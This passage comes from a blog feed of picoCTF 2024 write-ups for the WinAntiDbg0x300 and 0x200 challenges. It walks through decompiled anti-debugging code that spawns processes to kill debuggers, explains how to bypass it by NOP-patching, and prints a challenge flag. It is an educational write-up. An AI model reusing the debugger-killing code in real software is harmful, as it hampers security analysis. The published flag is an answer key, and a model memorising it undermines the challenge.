class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pcVar2 = WCharToChar(param_2[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;Error converting WChar to Char.\n&quot;</span>);</span><br><span class="line">  CloseHandle(MUTEX);</span><br><span class="line">  Terminate(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line">uVar3 = atoi(pcVar2);</span><br><span class="line">iVar1 = DebugActiveProcess(uVar3);</span><br><span class="line"><span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">  uVar4 = atoi(pcVar2);</span><br><span class="line">  uVar4 = getParentProcessID(uVar4);</span><br><span class="line">  iVar1 = OpenProcess(<span class="number">1</span>,<span class="number">0</span>,uVar4);</span><br></pre></td></tr></table></figure></li></ol><ul><li>Converts and validates the second argument (process ID) from wide character to char</li><li>Converts string PID to integer</li><li>If running as a child process, attempts to debug the parent process using DebugActiveProcess()</li><li>Gets the parent’s parent (the debugger) using getParentProcessID()</li><li>Attempts to open a handle to the debugger process</li></ul><ol start="4"><li>Debugger Termination<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">iVar1 = TerminateProcess(iVar1,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;Failed to terminate the debugger process.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(pcVar2);</span><br><span class="line">  CloseHandle(MUTEX);</span><br><span class="line">  Terminate(<span class="number">0xfe</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;Debugger process terminated successfully.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(pcVar2);</span><br><span class="line">  CloseHandle(MUTEX);</span><br><span class="line">  Terminate(<span class="number">0xfd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Tries to terminate the debugger process</li><li>Reports success (0xFD) or failure (0xFE) via exit codes</li></ul><ol start="5"><li>Normal Execution Path<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;No debugger was present. Exiting successfully.\n&quot;</span>);</span><br><span class="line">  uVar3 = atoi(pcVar2);</span><br><span class="line">  DebugActiveProcessStop(uVar3);</span><br><span class="line">  CloseHandle(MUTEX);</span><br><span class="line">  <span class="built_in">free</span>(pcVar2);</span><br><span class="line">  Terminate(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>If no debugger is detected, it detaches and exits normally with code 0</li></ul><h3 id="ChallengeThreadFunction"><a href="#ChallengeThreadFunction" class="headerlink" title="ChallengeThreadFunction"></a>ChallengeThreadFunction</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Removing unreachable block (ram,0x004038e0) */</span></span><br><span class="line"><span class="comment">/* WARNING: Removing unreachable block (ram,0x00403911) */</span></span><br><span class="line"><span class="comment">/* WARNING: Removing unreachable block (ram,0x00403929) */</span></span><br><span class="line"></span><br><span class="line">ulong __cdecl <span class="title function_">ChallengeThreadFunction</span><span class="params">(<span class="type">void</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined auStack_384 [<span class="number">520</span>];</span><br><span class="line">  <span class="type">char</span> acStack_17c [<span class="number">272</span>];</span><br><span class="line">  undefined4 auStack_6c [<span class="number">18</span>];</span><br><span class="line">  <span class="type">int</span> iStack_24;</span><br><span class="line">  undefined4 uStack_20;</span><br><span class="line">  undefined4 uStack_1c;</span><br><span class="line">  undefined4 uStack_18;</span><br><span class="line">  undefined4 uStack_14;</span><br><span class="line">  undefined4 uStack_10;</span><br><span class="line">  <span class="type">int</span> iStack_8;</span><br><span class="line">  </span><br><span class="line">  _memset(auStack_6c,<span class="number">0</span>,<span class="number">0x44</span>);</span><br><span class="line">  auStack_6c[<span class="number">0</span>] = <span class="number">0x44</span>;</span><br><span class="line">  uStack_1c = <span class="number">0</span>;</span><br><span class="line">  uStack_18 = <span class="number">0</span>;</span><br><span class="line">  uStack_14 = <span class="number">0</span>;</span><br><span class="line">  uStack_10 = <span class="number">0</span>;</span><br><span class="line">  iStack_8 = <span class="number">0</span>;</span><br><span class="line">  uStack_20 = GetCurrentProcessId();</span><br><span class="line">  GetModuleFileNameW(<span class="number">0</span>,auStack_384,<span class="number">0x104</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(acStack_17c,<span class="number">0x110</span>,<span class="string">&quot;%ws %d&quot;</span>);</span><br><span class="line">  ComputeHash(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    iStack_24 = CreateProcessA(<span class="number">0</span>,acStack_17c,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,auStack_6c,&amp;uStack_1c);</span><br><span class="line">    <span class="keyword">if</span> (iStack_24 == <span class="number">0</span>) &#123;</span><br><span class="line">      MessageBoxW(appWindow,<span class="string">L&quot;[FATAL ERROR]  Unable to create the child process. Challenge aborted.&quot;</span></span><br><span class="line">                  ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">      Terminate(<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    WaitForSingleObject(uStack_1c,<span class="number">0xffffffff</span>);</span><br><span class="line">    GetExitCodeProcess(uStack_1c,&amp;iStack_8);</span><br><span class="line">    <span class="keyword">if</span> (iStack_8 == <span class="number">0xff</span>) &#123;</span><br><span class="line">      MessageBoxW(appWindow,<span class="string">L&quot;Something went wrong. Challenge aborted.&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">      Terminate(<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iStack_8 == <span class="number">0xfe</span>) &#123;</span><br><span class="line">      MessageBoxW(appWindow,</span><br><span class="line">                  <span class="string">L&quot;The debugger was detected but our process wasn\&#x27;t able to fight it. Challenge ab orted.&quot;</span></span><br><span class="line">                  ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">      Terminate(<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iStack_8 == <span class="number">0xfd</span>) &#123;</span><br><span class="line">      MessageBoxW(appWindow,</span><br><span class="line">                  <span class="string">L&quot;Our process detected the debugger and was able to fight it. Don\&#x27;t be surprised if the debugger crashed.&quot;</span></span><br><span class="line">                  ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(uStack_1c);</span><br><span class="line">    CloseHandle(uStack_18);</span><br><span class="line">    Sleep(<span class="number">5000</span>);</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Initialization and Setup<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*<span class="built_in">memset</span>(auStack*<span class="number">6</span>c,<span class="number">0</span>,<span class="number">0x44</span>);</span><br><span class="line">auStack_6c[<span class="number">0</span>] = <span class="number">0x44</span>;</span><br><span class="line">uStack_1c = <span class="number">0</span>;</span><br><span class="line">uStack_18 = <span class="number">0</span>;</span><br><span class="line">uStack_14 = <span class="number">0</span>;</span><br><span class="line">uStack_10 = <span class="number">0</span>;</span><br><span class="line">iStack_8 = <span class="number">0</span>;</span><br><span class="line">uStack_20 = GetCurrentProcessId();</span><br><span class="line">GetModuleFileNameW(<span class="number">0</span>,auStack_384,<span class="number">0x104</span>);</span><br><span class="line"><span class="built_in">snprintf</span>(acStack_17c,<span class="number">0x110</span>,<span class="string">&quot;%ws %d&quot;</span>);</span><br><span class="line">ComputeHash(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></li></ol><ul><li>Initializes a STARTUPINFO structure for child process creation</li><li>Gets the current process ID</li><li>Gets the executable path of the current process</li><li>Formats a command line for the child process including the process ID</li><li>Computes a hash for integrity verification</li></ul><ol start="2"><li>Child Process Creation &amp; Monitoring Loop<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  iStack_24 = CreateProcessA(<span class="number">0</span>,acStack_17c,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,auStack_6c,&amp;uStack_1c);</span><br><span class="line">  <span class="keyword">if</span> (iStack_24 == <span class="number">0</span>) &#123;</span><br><span class="line">    MessageBoxW(appWindow,<span class="string">L&quot;[FATAL ERROR]  Unable to create the child process. Challenge aborted.&quot;</span></span><br><span class="line">                ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">    Terminate(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Enters an infinite loop to continuously monitor for debuggers</li><li>Creates a child process with the current process path and PID as arguments</li><li>Terminates with error if child process creation fails</li></ul><ol start="3"><li>Process Status Handling<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">WaitForSingleObject(uStack_1c,<span class="number">0xffffffff</span>);</span><br><span class="line">GetExitCodeProcess(uStack_1c,&amp;iStack_8);</span><br><span class="line"><span class="keyword">if</span> (iStack_8 == <span class="number">0xff</span>) &#123;</span><br><span class="line">  MessageBoxW(appWindow,<span class="string">L&quot;Something went wrong. Challenge aborted.&quot;</span>,szTitle,<span class="number">0x10</span>);</span><br><span class="line">  Terminate(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (iStack_8 == <span class="number">0xfe</span>) &#123;</span><br><span class="line">  MessageBoxW(appWindow,</span><br><span class="line">              <span class="string">L&quot;The debugger was detected but our process wasn\&#x27;t able to fight it. Challenge ab orted.&quot;</span></span><br><span class="line">              ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">  Terminate(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (iStack_8 == <span class="number">0xfd</span>) &#123;</span><br><span class="line">  MessageBoxW(appWindow,</span><br><span class="line">              <span class="string">L&quot;Our process detected the debugger and was able to fight it. Don\&#x27;t be surprised if the debugger crashed.&quot;</span></span><br><span class="line">              ,szTitle,<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>Waits indefinitely for the child process to complete</li><li>Retrieves the exit code from the child process</li><li>Handles different scenarios based on exit codes:<ul><li>0xFF: General error occurred</li><li>0xFE: Debugger detected but couldn’t be terminated</li><li>0xFD: Debugger detected and successfully terminated</li></ul></li></ul><ol start="4"><li>Cleanup<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CloseHandle(uStack_1c);</span><br><span class="line">CloseHandle(uStack_18);</span><br><span class="line">Sleep(<span class="number">5000</span>);</span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br></pre></td></tr></table></figure></li></ol><ul><li>Cleans up process and thread handles</li><li>Sleeps for 5 seconds before creating another child process</li><li>Continues this cycle indefinitely, constantly monitoring for debuggers</li></ul><p>In summary, that <code>while( true );</code> loop is pesky, as it creates an infinite loop to repeatedly spawn child processes that check for and attempt to terminate debuggers. It’s intentoinally designend to make reverse engineering this difficult (but it isn’t, I promise!) by activtely fighting against us. Unlike the other challenges, we won’t be able to just set breakpoints and edit registry values, as this loop is just infinite. </p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>If we click on the <code>while( true );</code> we can see the corresponding assembly. The remove this loop, we can right click the JMP instruction, select “Clear Code Bytes”, and then overwrite all new 5 entries to be a NOP by right clicking each one (or hitting CTRL+Shift+G) and selecting “Patch Instruction”. From there, just write <code>NOP</code> for each one. </p><p><img src="/images/winantidbg0x300/NOP.png" alt="nop"></p><p>Next, we can just export the project as a single file, run it while DebugView is open, and we should have our flag. </p><p>flag: <code>picoCTF&#123;Wind0ws_antid3bg_0x300_aba8ee97&#125;</code></p>]]></content>
    
    
    <summary type="html">Bypassing an infinite debugger-killing loop by NOP&#39;ing an unconditional jump</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Assembly" scheme="https://rivers.sh/tags/Assembly/"/>
    
    <category term="x64dbg" scheme="https://rivers.sh/tags/x64dbg/"/>
    
    <category term="C" scheme="https://rivers.sh/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>WinAntiDbg0x200</title>
    <link href="https://rivers.sh/posts/winantidbg0x200/"/>
    <id>https://rivers.sh/posts/winantidbg0x200/</id>
    <published>2025-04-03T04:00:00.000Z</published>
    <updated>2025-04-23T22:35:29.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>If you have solved WinAntiDbg0x100, you’ll discover something new in this one. Debug the executable and find the flag! This challenge executable is a Windows console application, and you can start by running it using Command Prompt on Windows. This executable requires admin privileges. You might want to start Command Prompt or your debugger using the ‘Run as administrator’ option. Challenge can be downloaded <a href="https://artifacts.picoctf.net/c_titan/59/WinAntiDbg0x200.zip">here</a>. Unzip the archive with the password <code>picoctf</code></p><p>This challenge is #2 of a 3 part series</p><h2 id="prev-winantidbg0x100next-winantidbg0x300"><a href="#prev-winantidbg0x100next-winantidbg0x300" class="headerlink" title="prev: winantidbg0x100next: winantidbg0x300"></a>prev: <a href="https://rivers.sh/posts/winantidbg0x100">winantidbg0x100</a><br>next: <a href="https://rivers.sh/posts/winantidbg0x300">winantidbg0x300</a></h2><h2 id="Understanding-the-user-code"><a href="#Understanding-the-user-code" class="headerlink" title="Understanding the user-code"></a>Understanding the user-code</h2><p>Like WinAntiDbg0x100, I started by analyzing the program in Ghidra. And just like last time, I ran a search on the word “flag” through program text. </p><p>We should find this user code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">undefined4 __cdecl <span class="title function_">FUN_004016e0</span><span class="params">(<span class="type">int</span> param_1,<span class="type">int</span> param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  HANDLE hObject;</span><br><span class="line">  DWORD DVar3;</span><br><span class="line">  BOOL BVar4;</span><br><span class="line">  uint uVar5;</span><br><span class="line">  LPWSTR lpOutputString;</span><br><span class="line">  undefined in_stack_fffffff0;</span><br><span class="line">  </span><br><span class="line">  iVar2 = FUN_004012f0();</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_00401910(<span class="string">&quot;[ERROR] There are permission issues. This program requires debug privileges and he nce you might want to run it as an Admin.\n&quot;</span></span><br><span class="line">                   ,in_stack_fffffff0);</span><br><span class="line">    FUN_00401910(<span class="string">&quot;Challenge aborted. Please run this program as an Admin. Exiting now...\n&quot;</span>,</span><br><span class="line">                   in_stack_fffffff0);</span><br><span class="line">                      <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  hObject = CreateMutexW((LPSECURITY_ATTRIBUTES)<span class="number">0x0</span>,<span class="number">0</span>,<span class="string">L&quot;WinAntiDbg0x200&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (hObject == (HANDLE)<span class="number">0x0</span>) &#123;</span><br><span class="line">    FUN_00401910(<span class="string">&quot;[ERROR] Failed to create the Mutex. Exiting now...\n&quot;</span>,in_stack_fffffff0);</span><br><span class="line">                      <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0xff</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  DVar3 = GetLastError();</span><br><span class="line">  <span class="keyword">if</span> (DVar3 == <span class="number">0xb7</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (param_1 != <span class="number">2</span>) &#123;</span><br><span class="line">      FUN_00401910(<span class="string">&quot;[ERROR] Expected an argument\n&quot;</span>,in_stack_fffffff0);</span><br><span class="line">                      <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0xbeef</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DVar3 = atoi(*(<span class="type">char</span> **)(param_2 + <span class="number">4</span>));</span><br><span class="line">    BVar4 = DebugActiveProcess(DVar3);</span><br><span class="line">    <span class="keyword">if</span> (BVar4 != <span class="number">0</span>) &#123;</span><br><span class="line">                      <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">                      <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0xbeef</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00401910(PTR_s________________________(_)_/_____00405000,in_stack_fffffff0);</span><br><span class="line">  uVar5 = FUN_00401600();</span><br><span class="line">  <span class="keyword">if</span> ((uVar5 &amp; <span class="number">0xff</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_00401910(<span class="string">&quot;### To start the challenge, you\&#x27;ll need to first launch this program using a debu gger!\n&quot;</span></span><br><span class="line">                   ,in_stack_fffffff0);</span><br><span class="line">    <span class="keyword">goto</span> LAB_004018de;</span><br><span class="line">  &#125;</span><br><span class="line">  OutputDebugStringW((LPCWSTR)&amp;lpOutputString_004036e0);</span><br><span class="line">  OutputDebugStringW((LPCWSTR)&amp;lpOutputString_004036e4);</span><br><span class="line">  FUN_00401400();</span><br><span class="line">  iVar2 = FUN_00401450();</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    OutputDebugStringW(<span class="string">L&quot;### Error reading the \&#x27;config.bin\&#x27; file... Challenge aborted.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    OutputDebugStringW(</span><br><span class="line">                         <span class="string">L&quot;### Level 2: Why did the parent process get a promotion at work? Because it had a \&quot;fork-tastic\&quot; child process that excelled in multitasking!\n&quot;</span></span><br><span class="line">                         );</span><br><span class="line">    FUN_00401090(<span class="number">3</span>);</span><br><span class="line">    cVar1 = FUN_004011d0();</span><br><span class="line">    <span class="keyword">if</span> (cVar1 == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">      BVar4 = IsDebuggerPresent();</span><br><span class="line">      <span class="keyword">if</span> (BVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">         FUN_00401090(<span class="number">1</span>);</span><br><span class="line">         FUN_00401180(DAT_0040509c);</span><br><span class="line">         lpOutputString = FUN_00401000(DAT_004050a0);</span><br><span class="line">         <span class="keyword">if</span> (lpOutputString == (LPWSTR)<span class="number">0x0</span>) &#123;</span><br><span class="line">           OutputDebugStringW(<span class="string">L&quot;### Something went wrong...\n&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">           OutputDebugStringW(<span class="string">L&quot;### Good job! Here\&#x27;s your flag:\n&quot;</span>);</span><br><span class="line">           OutputDebugStringW(<span class="string">L&quot;### ~~~ &quot;</span>);</span><br><span class="line">           OutputDebugStringW(lpOutputString);</span><br><span class="line">           OutputDebugStringW((LPCWSTR)&amp;lpOutputString_004039c0);</span><br><span class="line">           OutputDebugStringW(</span><br><span class="line">                                <span class="string">L&quot;### (Note: The flag could become corrupted if the process state is tam pered with in any way.)\n\n&quot;</span></span><br><span class="line">                                );</span><br><span class="line">           <span class="built_in">free</span>(lpOutputString);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">goto</span> LAB_004018ce;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    OutputDebugStringW(</span><br><span class="line">                         <span class="string">L&quot;### Oops! The debugger was detected. Try to bypass this check to get the fla g!\n&quot;</span></span><br><span class="line">                         );</span><br><span class="line">  &#125;</span><br><span class="line">LAB_004018ce:</span><br><span class="line">  <span class="built_in">free</span>(DAT_00405098);</span><br><span class="line">LAB_004018de:</span><br><span class="line">  CloseHandle(hObject);</span><br><span class="line">  OutputDebugStringW((LPCWSTR)&amp;lpOutputString_00403a88);</span><br><span class="line">  OutputDebugStringW((LPCWSTR)&amp;lpOutputString_00403a8c);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Right away, we notice more checks. I will concisely explain the user-code before moving to the assembly.</p><h3 id="1-Admin-privileges-check"><a href="#1-Admin-privileges-check" class="headerlink" title="#1. Admin privileges check"></a>#1. Admin privileges check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iVar2 = FUN_004012f0();</span><br><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  FUN_00401910(<span class="string">&quot;[ERROR] There are permission issues. This program requires debug privileges and hence you might want to run it as an Admin.\n&quot;</span>, in_stack_fffffff0);</span><br><span class="line">  FUN_00401910(<span class="string">&quot;Challenge aborted. Please run this program as an Admin. Exiting now...\n&quot;</span>, in_stack_fffffff0);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Ensures the program runs with admin privileges</li><li>Exits with error if check fails</li><li>For good practice, this will be the first check we bypass</li></ul><h3 id="2-Mutex-check"><a href="#2-Mutex-check" class="headerlink" title="#2. Mutex check"></a>#2. Mutex check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hObject = CreateMutexW((LPSECURITY_ATTRIBUTES)<span class="number">0x0</span>, <span class="number">0</span>, <span class="string">L&quot;WinAntiDbg0x200&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hObject == (HANDLE)<span class="number">0x0</span>) &#123;</span><br><span class="line">  FUN_00401910(<span class="string">&quot;[ERROR] Failed to create the Mutex. Exiting now...\n&quot;</span>, in_stack_fffffff0);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line">DVar3 = GetLastError();</span><br><span class="line"><span class="keyword">if</span> (DVar3 == <span class="number">0xb7</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (param_1 != <span class="number">2</span>) &#123;</span><br><span class="line">    FUN_00401910(<span class="string">&quot;[ERROR] Expected an argument\n&quot;</span>, in_stack_fffffff0);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0xbeef</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  DVar3 = atoi(*(<span class="type">char</span> **)(param_2 + <span class="number">4</span>));</span><br><span class="line">  BVar4 = DebugActiveProcess(DVar3);</span><br><span class="line">  <span class="keyword">if</span> (BVar4 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0xbeef</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Creates a mutex to ensure only one instance runs</li><li>If mutex already exists (error 0xB7), checks for command-line arguments</li><li>If present, tries to debug the process with 